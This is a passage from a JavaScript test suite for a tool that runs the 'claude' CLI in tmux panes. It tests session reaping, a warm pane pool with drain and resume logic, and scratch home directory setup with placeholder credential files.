  assert.equal(killed.join(","), "ocp-tui-3456-aaaa");
  assert.ok(!killed.includes("ocp-tui-9999-bbbb"), "sibling instance's session (port 9999) must NEVER be killed");
  assert.ok(!calls.includes("kill-server"), "kill-server MUST NOT fire — sibling instance's session still live");
});

test("reaper returns 0 when tmux status !== 0 (no server)", () => {
  const fakeTmux = (_args) => ({ status: 1, stdout: "" });
  const n = reapStaleTuiSessions({ tmux: fakeTmux, port: 3456 });
  assert.equal(n, 0);
});

test("reaper returns 0 for empty session list", () => {
  const killed = [];
  const fakeTmux = (args) => {
    if (args[0] === "list-sessions") return { status: 0, stdout: "" };
    if (args[0] === "kill-session") { killed.push(args[args.indexOf("-t") + 1]); return { status: 0 }; }
    return { status: 0, stdout: "" };
  };
  const n = reapStaleTuiSessions({ tmux: fakeTmux, port: 3456 });
  assert.equal(n, 0);
  assert.equal(killed.length, 0);
});

// Defunct-zombie reaping (PI231 incident): the pane's claude is a child of the tmux server,
// so only kill-server actually reaps it. We kill-server ONLY when no foreign session remains.
console.log("\nTUI defunct-zombie reaping (kill-server):");

test("reaper kill-servers when the server is ours-only (flush defunct claude zombies)", () => {
  const calls = [];
  const fakeTmux = (args) => {
    calls.push(args.join(" "));
    if (args[0] === "list-sessions") return { status: 0, stdout: "ocp-tui-3456-aaaa\nocp-tui-3456-bbbb\n" };
    return { status: 0, stdout: "" };
  };
  const n = reapStaleTuiSessions({ tmux: fakeTmux, port: 3456 });
  assert.equal(n, 2, "killed both of our sessions");
  assert.ok(calls.includes("kill-server"), "kill-server fired — reaps the defunct backlog");
});

test("reaper does NOT kill-server when a foreign (non-ocp) session remains (coexistence)", () => {
  const calls = [];
  const fakeTmux = (args) => {
    calls.push(args.join(" "));
    if (args[0] === "list-sessions") return { status: 0, stdout: "ocp-tui-3456-aaaa\nolp-tui-bbbb\n" };
    return { status: 0, stdout: "" };
  };
  const n = reapStaleTuiSessions({ tmux: fakeTmux, port: 3456 });
  assert.equal(n, 1, "killed only our own session");
  assert.ok(!calls.includes("kill-server"), "kill-server MUST NOT fire — would disrupt olp-tui-*");
});

test("reaper does NOT kill-server when there is no server (status !== 0)", () => {
  const calls = [];
  const fakeTmux = (args) => { calls.push(args.join(" ")); return { status: 1, stdout: "" }; };
  reapStaleTuiSessions({ tmux: fakeTmux, port: 3456 });
  assert.ok(!calls.includes("kill-server"), "no server → no kill-server (early return)");
});

// Legacy migration (F7): pre-fix versions created bare-prefix `ocp-tui-<uuid8>` sessions with
// no port segment. includeLegacy is the boot-only opt-in that claims these as our own leftover
// zombies; the periodic sweep never sets it, so a lingering legacy session cannot trigger
// kill-server on a routine 15-minute tick.
console.log("\nTUI legacy-prefix migration (boot-only reap, F7):");

test("reaper leaves legacy bare-prefix sessions untouched by default (includeLegacy unset)", () => {
  const killed = [];
  const calls = [];
  const fakeTmux = (args) => {
    calls.push(args.join(" "));
    if (args[0] === "list-sessions") return { status: 0, stdout: "ocp-tui-3456-aaaa\nocp-tui-deadbeef\n" };
    if (args[0] === "kill-session") { killed.push(args[args.indexOf("-t") + 1]); return { status: 0 }; }
    return { status: 0, stdout: "" };
  };
  const n = reapStaleTuiSessions({ tmux: fakeTmux, port: 3456 });
  assert.equal(n, 1, "killed only the own-port session");
  assert.ok(!killed.includes("ocp-tui-deadbeef"), "legacy session must NOT be reaped without includeLegacy");
  assert.ok(!calls.includes("kill-server"), "legacy session blocks kill-server when not claimed");
});

test("reaper claims legacy bare-prefix sessions when includeLegacy=true (boot-time migration)", () => {
  const killed = [];
  const calls = [];
  const fakeTmux = (args) => {
    calls.push(args.join(" "));
    if (args[0] === "list-sessions") return { status: 0, stdout: "ocp-tui-3456-aaaa\nocp-tui-deadbeef\n" };
    if (args[0] === "kill-session") { killed.push(args[args.indexOf("-t") + 1]); return { status: 0 }; }
    return { status: 0, stdout: "" };
  };
  const n = reapStaleTuiSessions({ tmux: fakeTmux, port: 3456, includeLegacy: true });
  assert.equal(n, 2, "both own-port and legacy sessions reaped");
  assert.ok(killed.includes("ocp-tui-deadbeef"), "legacy session claimed as our own leftover");
  assert.ok(calls.includes("kill-server"), "kill-server fires once no foreign/unclaimed session remains");
});

test("reaper with includeLegacy=true still spares a sibling instance's port-scoped session", () => {
  const killed = [];
  const calls = [];
  const fakeTmux = (args) => {
    calls.push(args.join(" "));
    if (args[0] === "list-sessions") return { status: 0, stdout: "ocp-tui-3456-aaaa\nocp-tui-deadbeef\nocp-tui-9999-zzzz\n" };
    if (args[0] === "kill-session") { killed.push(args[args.indexOf("-t") + 1]); return { status: 0 }; }
    return { status: 0, stdout: "" };
  };
  const n = reapStaleTuiSessions({ tmux: fakeTmux, port: 3456, includeLegacy: true });
  assert.equal(n, 2, "own-port + legacy reaped, sibling instance untouched");
  assert.ok(!killed.includes("ocp-tui-9999-zzzz"), "sibling instance session must never be claimed as legacy");
  assert.ok(!calls.includes("kill-server"), "sibling instance's live session still blocks kill-server");
});

// ── TUI warm pane pool (docs/plans/2026-07-13-tui-latency #3) ────────────
import { TuiPanePool, resolvePoolSize, POOL_MAX_SIZE, POOL_MAX_AGE_MS } from "./lib/tui/pool.mjs";
import { poolPaneName as poolName } from "./lib/tui/session.mjs";

// A pool wired to fakes: no tmux, no claude. bootPane resolves on the microtask queue; use
// `await settle()` after a refill() to let the SERIALIZED boot chain run to target.
// `live` models the real tmux server: bootTuiPane creates the session SYNCHRONOUSLY and only
// THEN waits (up to POOL_BOOT_MS) for the input bar, so the fake boot registers the session
// immediately and only afterwards resolves. `opts.hold` keeps a boot in that mid-flight window
// so tests can act on a pane that is live-but-not-yet-warm — the state that hid two bugs.
function makeFakePool(opts = {}) {
  const killed = [];
  const booted = [];
  const live = new Set();   // "tmux sessions" that currently exist
  let seq = 0;
  let clock = 1_000_000;
  const healthy = new Set();
  // FIFO gate queue — one entry per in-flight held boot. A single `release` slot would be
  // OVERWRITTEN by a later boot, so releasing "the first boot" would silently release the
  // second instead (and mask the stale-settle bug this harness exists to test).
  const gates = [];
  const pool = new TuiPanePool({
    size: opts.size ?? 2,
    maxAgeMs: opts.maxAgeMs ?? POOL_MAX_AGE_MS,
    now: () => clock,
    mintPane: () => {
      const n = ++seq;
      return { sessionId: `sid-${n}`, name: `ocp-tui-3456-p${String(n).padStart(8, "0")}` };
    },
    bootPane: async (model, { sessionId, name }) => {
      live.add(name);                                     // session exists NOW
      booted.push({ name, model });
      if (opts.hold) {
        await new Promise((r) => gates.push(r));          // ...stuck waiting for readiness
      }
      if (opts.bootThrows) { live.delete(name); throw new Error("boom"); }
      // A pane whose session was killed while booting can never become ready — exactly what
      // the real bootTuiPane does (it throws tui_pane_not_ready).
      if (!live.has(name)) throw new Error("tui_pane_not_ready");
      healthy.add(name);
      return { name, sessionId, model, bootedAt: clock };
    },
    killPane: (name) => { killed.push(name); healthy.delete(name); live.delete(name); },
    paneHealthy: (name) => healthy.has(name),
  });
  return {
    pool, killed, booted, healthy, live,
    releaseBoot: () => { const r = gates.shift(); if (r) r(); },  // release the OLDEST held boot
    advance: (ms) => { clock += ms; }, at: () => clock,
  };
}
const tick = () => new Promise((r) => setImmediate(r));
// Refills are SERIALIZED (one boot at a time, re-kicked on success), so settling the pool
// takes a chain of microtask turns, not one. 40 is far more than POOL_MAX_SIZE needs.
const settle = async () => { for (let i = 0; i < 40; i++) await tick(); };

console.log("\nTUI warm pane pool (acquire / miss / refill / TTL / reaper exemption):");

test("resolvePoolSize: default/garbage/negative disable the pool; size is clamped to POOL_MAX_SIZE", () => {
  assert.equal(resolvePoolSize(undefined), 0, "unset => off (byte-for-byte today's cold path)");
  assert.equal(resolvePoolSize("0"), 0);
  assert.equal(resolvePoolSize("-3"), 0);
  assert.equal(resolvePoolSize("banana"), 0, "garbage disables rather than guessing a size");
  assert.equal(resolvePoolSize("2"), 2);
  assert.equal(resolvePoolSize("99"), POOL_MAX_SIZE, "clamped — never boot an unbounded number of idle claudes");
});

test("pool size 0 is inert: acquire always misses and refill never boots", async () => {
  const { pool, booted } = makeFakePool({ size: 0 });
  assert.equal(pool.enabled, false);
  assert.equal(pool.acquire("m1"), null, "disabled pool always MISSES → caller cold-boots");
  pool.refill();
  await settle();
  assert.equal(booted.length, 0, "a disabled pool must never spawn a process");
});

test("acquire MISSES on an empty pool, and the miss refills for the requested model", async () => {
  const { pool, booted } = makeFakePool({ size: 2 });
  assert.equal(pool.acquire("sonnet"), null, "first request is always a MISS (no boot-time pre-warm)");
  assert.equal(pool.misses, 1);
  pool.refill();
  await settle();
  assert.equal(pool.warm, 2, "refilled to target");
  assert.deepEqual(booted.map((b) => b.model), ["sonnet", "sonnet"], "warmed for the model that missed");
});

test("acquire HITS a warm pane, hands it out ONCE, and never returns it (single-use)", async () => {
  const { pool } = makeFakePool({ size: 2 });
  pool.acquire("sonnet"); pool.refill(); await settle();
  assert.equal(pool.warm, 2);

  const a = pool.acquire("sonnet");
  assert.ok(a && a.name && a.sessionId, "warm pane handed out");
  assert.equal(pool.hits, 1);
  assert.equal(pool.warm, 1, "the pane LEAVES the registry when acquired");

  const b = pool.acquire("sonnet");
  assert.notEqual(b.name, a.name, "a pane is NEVER handed out twice — single-use");
  assert.notEqual(b.sessionId, a.sessionId, "each pane carries its OWN fresh session-id (transcript.mjs scoping)");
  assert.equal(pool.warm, 0);
  assert.equal(pool.acquire("sonnet"), null, "exhausted pool MISSES rather than reusing a pane");
});

test("refill is bounded: never more than `size` panes, and concurrent refills do not overshoot", async () => {
  const { pool, booted } = makeFakePool({ size: 2 });
  pool.acquire("sonnet");
  pool.refill(); pool.refill(); pool.refill(); // hammer it
  await settle();
  assert.equal(pool.warm, 2, "still exactly `size` warm panes");
  assert.equal(booted.length, 2, "the _booting guard prevented duplicate boots");
});

// Live finding at size=2: two cold `claude` boots racing an in-flight turn made a refill
// overrun even the generous pool readiness cap. Boots are therefore SERIALIZED.
test("refill boots panes ONE AT A TIME (never two claude cold-boots racing each other)", async () => {
  let concurrent = 0, peak = 0;
  let seq = 0;
  const pool = new TuiPanePool({
    size: 3,
    mintPane: () => { const n = ++seq; return { sessionId: `s${n}`, name: `p${n}` }; },
    bootPane: async (model, { sessionId, name }) => {
      concurrent++; peak = Math.max(peak, concurrent);
      await new Promise((r) => setImmediate(r)); // simulate boot latency
      concurrent--;
      return { name, sessionId, model, bootedAt: Date.now() };
    },
    killPane: () => {},
    paneHealthy: () => true,
  });
  pool.acquire("sonnet");
  pool.refill();
  await settle();
  assert.equal(pool.warm, 3, "chain still reaches the target size");
  assert.equal(peak, 1, "at most ONE boot in flight at any moment");
});

test("a FAILED boot does not re-kick the chain (backoff — a broken claude must not spin)", async () => {
  const { pool, booted } = makeFakePool({ size: 3, bootThrows: true });
  pool.acquire("sonnet");
  pool.refill();
  await settle();
  assert.equal(pool.bootFailures, 1, "counted as a genuine failure (nobody cancelled it)");
  assert.equal(booted.length, 1, "exactly ONE attempt — a failure stops the chain, it does not respawn forever");
  assert.equal(pool.warm, 0);
  assert.equal(pool.booting, 0, "and the booting slot is released, so the next trigger can retry");
});

test("acquire drops an UNHEALTHY warm pane (kills it) and falls through to a MISS", async () => {
  const { pool, killed, healthy, booted } = makeFakePool({ size: 1 });
  pool.acquire("sonnet"); pool.refill(); await settle();
  const dead = booted[0].name;
  healthy.delete(dead); // pane died / stopped being input-ready while idle

  assert.equal(pool.acquire("sonnet"), null, "a dead pane must MISS, never hang a turn");
  assert.ok(killed.includes(dead), "the dead pane is killed, not leaked");
  assert.equal(pool.misses, 2);
});

test("acquire drops an EXPIRED warm pane (older than maxAgeMs)", async () => {
  const { pool, killed, booted, advance } = makeFakePool({ size: 1, maxAgeMs: 60_000 });
  pool.acquire("sonnet"); pool.refill(); await settle();
  advance(60_001);
  assert.equal(pool.acquire("sonnet"), null, "a pane past its TTL is not handed out");
  assert.ok(killed.includes(booted[0].name), "expired pane is killed");
});

test("a model switch drops the wrong-model panes and retargets the pool (--model is fixed at spawn)", async () => {
  const { pool, killed, booted } = makeFakePool({ size: 2 });
  pool.acquire("sonnet"); pool.refill(); await settle();
  const sonnetPanes = booted.map((b) => b.name);

  assert.equal(pool.acquire("opus"), null, "different model => MISS (a sonnet pane cannot serve opus)");
  assert.equal(pool.warm, 0, "sonnet panes dropped");
  for (const p of sonnetPanes) assert.ok(killed.includes(p), "wrong-model pane killed, not leaked");
  assert.equal(pool.warmModel, "opus", "pool retargeted to the model actually being asked for");

  pool.refill(); await settle();
  assert.deepEqual(booted.slice(2).map((b) => b.model), ["opus", "opus"], "refilled for the NEW model");
});

test("a boot that resolves AFTER a drain kills its own pane instead of enlisting it", async () => {
  const { pool, live } = makeFakePool({ size: 1 });
  pool.acquire("sonnet");
  pool.refill();          // boot is in flight...
  pool.drain();           // ...pool drained before it resolves (shutdown / reap sweep)
  await settle();
  assert.equal(pool.warm, 0, "the late pane must NOT be enlisted into a drained pool");
  // Assert LIVENESS, not the kill-call COUNT. This assertion used to read
  // `assert.equal(killed.length, 1)` — and it PASSED while the orphan it is named after was
  // actually present: _cancelBooting kills BY NAME, and at drain time the tmux session does not
  // exist yet (bootPane runs on a microtask), so that kill is a NO-OP which still increments the
  // counter. "kill was called once" and "a live session is orphaned" were both true at the same
  // time. The only honest question is whether the session is dead.
  assert.equal(live.size, 0, "it kills itself — no orphan process left behind");
});

test("bootPane failure is counted, never thrown into the request path, and does not wedge refill", async () => {
  const { pool } = makeFakePool({ size: 1, bootThrows: true });
  pool.acquire("sonnet");
  pool.refill();
  await settle();
  assert.equal(pool.warm, 0);
  assert.equal(pool.bootFailures, 1);
  assert.equal(pool.booting, 0, "the _booting counter is released on failure (else refill wedges forever)");
  assert.equal(pool.acquire("sonnet"), null, "and the caller just MISSES → cold path");
});

test("drain kills every warm pane and pauses refills; resume restarts them", async () => {
  const { pool, killed } = makeFakePool({ size: 2 });
  pool.acquire("sonnet"); pool.refill(); await settle();
  assert.equal(pool.warm, 2);

  assert.equal(pool.drain(), 2, "drain reports how many it killed");
  assert.equal(pool.warm, 0);
  assert.equal(killed.length, 2, "both panes killed — none outlive the drain");

  pool.refill(); await settle();
  assert.equal(pool.warm, 0, "refill is a NO-OP while drained (paused)");

  pool.resume(); await settle();
  assert.equal(pool.warm, 2, "resume refills");
});

// ── The crux: pool ↔ reaper coexistence (POOL/REAPER INVARIANT, lib/tui/session.mjs) ──
console.log("\nTUI warm pool ↔ session reaper coexistence:");

test("INVARIANT 1: a LIVE pooled pane is NEVER reaped (it is in the spare set)", () => {
  const killed = [];
  const live = "ocp-tui-3456-pdeadbeef";
  const fakeTmux = (args) => {
    if (args[0] === "list-sessions") return { status: 0, stdout: `${live}\nocp-tui-3456-aaaa\n` };
    if (args[0] === "kill-session") { killed.push(args[args.indexOf("-t") + 1]); return { status: 0 }; }
    return { status: 0, stdout: "" };
  };
  const n = reapStaleTuiSessions({ tmux: fakeTmux, port: 3456, spare: new Set([live]) });
  assert.equal(n, 1, "only the stale turn session was reaped");
  assert.ok(!killed.includes(live), "the live warm pane must survive the sweep");
  assert.ok(killed.includes("ocp-tui-3456-aaaa"), "a genuinely stale own session is still reaped");
});

test("INVARIANT 2: an ORPHANED pooled pane (pool-shaped but NOT in the spare set) IS reaped", () => {
  const killed = [];
  // ocp-tui-3456-porphan01 LOOKS pooled but the live registry does not claim it — e.g. left
  // behind by a previous process generation, whose in-memory registry died with it.
  const fakeTmux = (args) => {
    if (args[0] === "list-sessions") return { status: 0, stdout: "ocp-tui-3456-porphan01\nocp-tui-3456-plive0001\n" };
    if (args[0] === "kill-session") { killed.push(args[args.indexOf("-t") + 1]); return { status: 0 }; }
    return { status: 0, stdout: "" };
  };
  const n = reapStaleTuiSessions({ tmux: fakeTmux, port: 3456, spare: new Set(["ocp-tui-3456-plive0001"]) });
  assert.equal(n, 1);
  assert.deepEqual(killed, ["ocp-tui-3456-porphan01"], "exemption is by EXACT NAME, never by name shape");
});

test("INVARIANT 2b: with NO spare set (the pre-pool call shape) pool-shaped panes are reaped — fail-safe", () => {
  const killed = [];
  const fakeTmux = (args) => {
    if (args[0] === "list-sessions") return { status: 0, stdout: "ocp-tui-3456-pdeadbeef\n" };
    if (args[0] === "kill-session") { killed.push(args[args.indexOf("-t") + 1]); return { status: 0 }; }
    return { status: 0, stdout: "" };
  };
  const n = reapStaleTuiSessions({ tmux: fakeTmux, port: 3456 });
  assert.equal(n, 1, "omitting `spare` reaps MORE, never less — forgetting it can't leak panes");
  assert.deepEqual(killed, ["ocp-tui-3456-pdeadbeef"]);
});

test("INVARIANT 3: kill-server is SUPPRESSED while a live pooled pane is spared", () => {
  const calls = [];
  const live = "ocp-tui-3456-plive0001";
  const fakeTmux = (args) => {
    calls.push(args.join(" "));
    if (args[0] === "list-sessions") return { status: 0, stdout: `${live}\nocp-tui-3456-aaaa\n` };
    return { status: 0, stdout: "" };
  };
  reapStaleTuiSessions({ tmux: fakeTmux, port: 3456, spare: new Set([live]) });
  assert.ok(!calls.includes("kill-server"), "kill-server would kill the live pane (a child of the tmux server)");
});

test("INVARIANT 3b: after a DRAIN the spare set is empty, so kill-server fires again (zombie reaping preserved)", async () => {
  // This is the whole reason server.mjs drains BEFORE the periodic sweep: a permanently-full
  // pool would otherwise permanently suppress the only mechanism that reaps defunct claudes.
  const { pool } = makeFakePool({ size: 2 });
  pool.acquire("sonnet"); pool.refill(); await settle();
  assert.equal(pool.liveNames().size, 2, "pool is full → the sweep would be suppressed");

  pool.drain();
  assert.equal(pool.liveNames().size, 0, "drain empties the live registry");

  const calls = [];
  const fakeTmux = (args) => {
    calls.push(args.join(" "));
    if (args[0] === "list-sessions") return { status: 0, stdout: "ocp-tui-3456-aaaa\n" };
    return { status: 0, stdout: "" };
  };
  reapStaleTuiSessions({ tmux: fakeTmux, port: 3456, spare: pool.liveNames() });
  assert.ok(calls.includes("kill-server"), "kill-server fires post-drain — defunct zombies still get reaped");
});

// ── MID-BOOT: the state that hid M1a + M1b ────────────────────────────────────────────
// bootTuiPane creates the tmux session SYNCHRONOUSLY, then waits up to POOL_BOOT_MS (20s)
// for the input bar. So a pooled session can be LIVE for ~20s before its boot resolves.
// Every reaper test above uses a pool that is either full or drained — never mid-boot.
// That gap is exactly why both bugs shipped past the first round of tests.

test("M1a: a reap tick during an IN-FLIGHT BOOT must not orphan-kill the booting pane", async () => {
  const { pool, live } = makeFakePool({ size: 1, hold: true });
  pool.acquire("sonnet");
  pool.refill();
  await tick();                                    // boot started; session live; NOT yet warm
  assert.equal(pool.warm, 0, "not warm yet");
  assert.equal(pool.booting, 1, "a boot is in flight");
  assert.equal(live.size, 1, "...and its tmux session ALREADY EXISTS");

  const bootingName = [...live][0];
  assert.ok(pool.liveNames().has(bootingName),
    "REGRESSION GUARD: the booting pane MUST be nameable, or the sweep cannot spare it " +
    "(the pool used to track in-flight boots as a COUNT and this was empty)");
});

test("M1a: the reap tick's drain kills the booting pane, and resume() starts a FRESH boot", async () => {
  const warns = [];
  const { pool, live, releaseBoot } = makeFakePool({ size: 1, hold: true });
  pool._log = (lvl, ev) => { if (lvl === "warn") warns.push(ev); };
  pool.acquire("sonnet");
  pool.refill();
  await tick();
  const first = [...live][0];

  // The reap tick, as server.mjs runs it: drain -> reap -> resume.
  const drained = pool.drain();
  assert.equal(drained, 1, "drain accounts for the booting pane");
  assert.equal(live.size, 0, "its tmux session is killed — kill-server can now flush zombies");
  assert.equal(pool.liveNames().size, 0, "nothing left to spare, so kill-server is not suppressed");

  pool.resume();
  await tick();
  assert.equal(pool.booting, 1, "resume() started a FRESH boot — the pool is not left empty with nothing scheduled");
  assert.notEqual([...live][0], first, "and it is a NEW pane, not the killed one");

  // Now let the ORIGINAL (cancelled) boot settle. It rejects with tui_pane_not_ready because
  // we killed its session — but that is OUR doing, not a fault.
  releaseBoot();
  await settle();
  assert.equal(pool.bootFailures, 0,
    "a cancelled boot must NOT be counted as a bootFailure — that is the WARN operators alert on");
  assert.deepEqual(warns, [], "and it must not log tui_pool_boot_failed for a healthy drain");
  assert.equal(pool.cancelled, 1, "it is counted as a cancellation instead (counted exactly once)");
});

test("M1b: shutdown drain kills the booting pane SYNCHRONOUSLY — no orphaned claude", async () => {
  const { pool, live } = makeFakePool({ size: 1, hold: true });
  pool.acquire("sonnet");
  pool.refill();
  await tick();
  assert.equal(live.size, 1, "a live pooled session exists");

  // gracefulShutdown: drain() then process.exit(0) IN THE SAME TICK (TUI panes are tmux
  // children, not node children, so activeProcesses is empty and the exit is immediate).
  // Nothing scheduled on the microtask queue can run. So we assert WITHOUT awaiting.
  pool.drain();
  assert.equal(live.size, 0,
    "REGRESSION GUARD: the pane must be dead BEFORE any await. A .then()-based cleanup would " +
    "never run before process.exit and would orphan a live authenticated `claude`.");
});

// M1b, second costume: drain() in the SAME synchronous block as refill(). The tmux session does
// not exist yet at drain time (bootPane runs on a microtask), so _cancelBooting's kill-by-name is
// a no-op — and a `.then` that merely `return`s on a stale generation would then let the boot
// CREATE the session and walk away from it. Not reachable from any current call site, but ADR 0008
// and the reap-tick comment both contemplate a boot-time pre-warm, which is exactly this shape.
// NOTE: deliberately NOT `hold: true`. A held boot never settles, so its `.then` never runs and
// the guard would vacuously pass — the test must let the boot actually SUCCEED, because the bug is
// precisely that a SUCCESSFUL boot on a cancelled generation walks away from its live session.
test("M1b': a boot cancelled BEFORE its session existed is still killed when it settles", async () => {
  const { pool, live } = makeFakePool({ size: 1 });
  pool.acquire("sonnet");                 // miss → learns the model

  pool.refill();   // mints the identity; bootPane is queued on a microtask — no session YET
  pool.drain();    // SAME sync block: kill-by-name finds nothing to kill (no-op), bumps the gen
  assert.equal(live.size, 0, "precondition: the session genuinely did not exist at cancel time");

  await tick();    // NOW the boot microtask runs, CREATES the session, and settles on a stale gen
  await tick();

  assert.equal(live.size, 0,
    "REGRESSION GUARD: a stale-generation boot must KILL its pane, not assume _cancelBooting " +
    "already did. _cancelBooting kills BY NAME, and the tmux session does not exist until the " +
    "boot microtask runs — so a cancellation landing first is a no-op, and a bare `return` here " +
    "orphans a live authenticated `claude` that nothing owns.");
});

test("a stale boot settling after drain+resume must not clear the NEW boot's slot", async () => {
  const { pool, releaseBoot } = makeFakePool({ size: 1, hold: true });
  pool.acquire("sonnet");
  pool.refill();
  await tick();
  pool.drain();                 // cancels boot #1 (generation bumped)
  pool.resume();
  await tick();
  assert.equal(pool.booting, 1, "boot #2 owns the slot");
  releaseBoot();                // boot #1 finally settles (rejects)
  await settle();
  assert.equal(pool.booting, 1, "boot #2 STILL owns the slot — a stale settle must not free it");
});

test("a model switch cancels an in-flight boot for the OLD model (kills it, frees the slot)", async () => {
  const { pool, live, killed } = makeFakePool({ size: 1, hold: true });
  pool.acquire("sonnet");
  pool.refill();
  await tick();
  const sonnetPane = [...live][0];

  pool.acquire("opus");         // retarget mid-boot
  assert.ok(killed.includes(sonnetPane), "the old model's booting pane is killed, not left to linger");
  assert.equal(pool.booting, 0, "and its slot is freed immediately, so the new model can boot now");
  assert.equal(pool.warmModel, "opus");

  pool.refill();
  await tick();
  assert.equal(pool.booting, 1, "a boot for the NEW model starts without waiting out the old one");
});

test("a pane handed out for a turn leaves the spare set immediately (so its teardown is authoritative)", async () => {
  const { pool } = makeFakePool({ size: 2 });
  pool.acquire("sonnet"); pool.refill(); await settle();
  const taken = pool.acquire("sonnet");
  assert.ok(!pool.liveNames().has(taken.name),
    "an acquired pane is the CALLER's — the pool must not also claim it live, or a crashed turn's pane would be spared forever");
});

test("N1: the pool mints ONE identity — the tmux name's hex is the transcript session-id's hex", async () => {
  // Without this, `tmux ls` shows a pane whose name has no relation to any transcript file,
  // so a live pane cannot be correlated to <HOME>/.claude/projects/*/<sessionId>.jsonl.
  const seen = [];
  const pool = new TuiPanePool({
    size: 1,
    mintPane: () => {
      const sessionId = "deadbeef-1111-2222-3333-444444444444";
      return { sessionId, name: poolName(3456, sessionId) };
    },
    bootPane: async (model, ident) => {
      seen.push(ident);
      return { ...ident, model, bootedAt: Date.now() };
    },
    killPane: () => {},
    paneHealthy: () => true,
  });
  pool.acquire("sonnet");
  pool.refill();
  await settle();
  assert.equal(seen.length, 1, "bootPane received the pool-minted identity");
  assert.equal(seen[0].name, "ocp-tui-3456-pdeadbeef");
  assert.ok(seen[0].name.endsWith(seen[0].sessionId.slice(0, 8)),
    "the tmux session name carries the session-id's own hex — `tmux ls` correlates to the transcript");
  const pane = pool.acquire("sonnet");
  assert.equal(pane.sessionId, seen[0].sessionId,
    "and the turn reads the transcript under THAT session-id — one identity end to end");
});

test("pool pane names are port-scoped (reapable as ours) and never match the legacy shape", () => {
  const name = poolName(3456, "deadbeef-1111-2222-3333-444444444444");
  assert.ok(name.startsWith(sessionPrefixForPort(3456)), "pool panes are OURS → reapable when orphaned");
  assert.equal(name, "ocp-tui-3456-pdeadbeef");
  assert.ok(!LEGACY_SESSION_NAME_RE.test(name), "must never be mistaken for a legacy bare-prefix session");
  assert.ok(!poolName(9999, "aaaaaaaa-0000-0000-0000-000000000000").startsWith(sessionPrefixForPort(3456)),
    "a sibling instance's pool pane is foreign to us");
});

test("buildTuiHealthBlock reports pool:null when off, and the pool's stats when on", async () => {
  const st = { lastEntrypoint: "cli", entrypointMismatches: 0 };
  const sem = { inflight: 0, queued: 0 };
  const off = buildTuiHealthBlock({ enabled: true, entrypointMode: "cli", maxConcurrent: 2 }, st, sem, null);
  assert.equal(off.pool, null, "pool disabled → explicit null (stable /health shape)");

  const { pool } = makeFakePool({ size: 2 });
  pool.acquire("sonnet"); pool.refill(); await settle();
  const on = buildTuiHealthBlock({ enabled: true, entrypointMode: "cli", maxConcurrent: 2 }, st, sem, pool);
  assert.equal(on.pool.size, 2);
  assert.equal(on.pool.warm, 2);
  assert.equal(on.pool.misses, 1);
  assert.equal(on.pool.model, "sonnet");
});

// ── TUI home preparation (scratch vs real) ───────────────────────────────
import { prepareTuiHome, ensureTuiCwdTrusted } from "./lib/tui/session.mjs";
import { mkdtempSync as hMkdtemp, mkdirSync as hMkdir, writeFileSync as hWrite, readFileSync as hRead, existsSync as hExists, readlinkSync as hReadlink } from "node:fs";
import { tmpdir as hTmp } from "node:os";

console.log("\nTUI home preparation:");

test("prepareTuiHome scratch mode: symlinks creds, seeds onboarded config, trusts cwd, strips history", () => {
  const realHome = hMkdtemp(testJoin(hTmp(), "real-"));
  hMkdir(testJoin(realHome, ".claude"), { recursive: true });
  hWrite(testJoin(realHome, ".claude", ".credentials.json"), '{"token":"x"}');
  hWrite(testJoin(realHome, ".claude.json"), JSON.stringify({ theme: "dark", projects: { "/old/secret/project": { hasTrustDialogAccepted: true } } }));
  const tuiHome = hMkdtemp(testJoin(hTmp(), "tui-"));
  const cwd = testJoin(tuiHome, "work");
  prepareTuiHome(realHome, tuiHome, cwd);
  // credentials symlinked (token never copied)
  assert.equal(hReadlink(testJoin(tuiHome, ".claude", ".credentials.json")), testJoin(realHome, ".claude", ".credentials.json"));
  const seed = JSON.parse(hRead(testJoin(tuiHome, ".claude.json"), "utf8"));
  assert.equal(seed.hasCompletedOnboarding, true);
  assert.equal(seed.theme, "dark");                                   // onboarded config carried over
  assert.equal(seed.projects[cwd].hasTrustDialogAccepted, true);      // scratch cwd trusted
  assert.equal(seed.projects["/old/secret/project"], undefined);      // user project history stripped
  assert.ok(hExists(testJoin(tuiHome, ".claude", "projects")));    // own projects dir
});

test("prepareTuiHome real mode (tuiHome===realHome): no symlink, just trusts cwd in real config", () => {
  const realHome = hMkdtemp(`${hTmp()}/real2-`);
  hWrite(`${realHome}/.claude.json`, JSON.stringify({ projects: {} }));
  const cwd = `${realHome}/work`;
  prepareTuiHome(realHome, realHome, cwd);
  assert.ok(!hExists(`${realHome}/.claude/.credentials.json`));        // no scratch symlink created
  const j = JSON.parse(hRead(`${realHome}/.claude.json`, "utf8"));
  assert.equal(j.projects[cwd].hasTrustDialogAccepted, true);         // cwd trusted in real config
});

// ── PR-D: env-token-only credential-isolated home (PI231 401 root fix) ──────
// Interactive claude PREFERS ~/.claude/.credentials.json over CLAUDE_CODE_OAUTH_TOKEN, so a
// stale/corrupt credentials.json SHADOWS the env token (proven live on PI231 — env token +
// broken creds = 401; env token + creds moved aside = works). The fix runs the TUI claude in
// a home with NO credentials.json so the env token is authoritative (and no refresh ever
// happens → the single-use token can't be corrupted by the spawn+kill cycle).
test("prepareTuiHome env-token mode: NO credentials.json (no symlink, no copy), .claude.json seeded", () => {
  const realHome = hMkdtemp(`${hTmp()}/realT-`);
  hMkdir(`${realHome}/.claude`, { recursive: true });
  hWrite(`${realHome}/.claude/.credentials.json`, '{"token":"real-oauth"}');  // real creds DO exist…
  hWrite(`${realHome}/.claude.json`, JSON.stringify({ theme: "dark", oauthAccount: { uuid: "secret" }, projects: { "/old/secret": { hasTrustDialogAccepted: true } } }));
  const tuiHome = hMkdtemp(`${hTmp()}/scratchT-`);
  const cwd = `${tuiHome}/work`;
  prepareTuiHome(realHome, tuiHome, cwd, { envTokenMode: true });
  // …but the scratch home has NO credentials file at all — neither symlink nor copy.
  assert.ok(!hExists(`${tuiHome}/.claude/.credentials.json`), "env-token home must have NO .credentials.json (the whole point — no shadowing, no refresh)");
  // .claude.json IS seeded: onboarding complete + ONLY the scratch cwd trusted (no dialog hang).
  const seed = JSON.parse(hRead(`${tuiHome}/.claude.json`, "utf8"));
  assert.equal(seed.hasCompletedOnboarding, true, "onboarding pre-completed → no onboarding dialog");
  assert.equal(seed.projects[cwd].hasTrustDialogAccepted, true, "scratch cwd pre-trusted → no trust dialog");
  // Minimal config: the credential-isolated home does NOT inherit the operator's account state.
  assert.equal(seed.theme, undefined, "env-token home is minimal — real config not copied in");
  assert.equal(seed.oauthAccount, undefined, "real account state not carried into the isolated home");
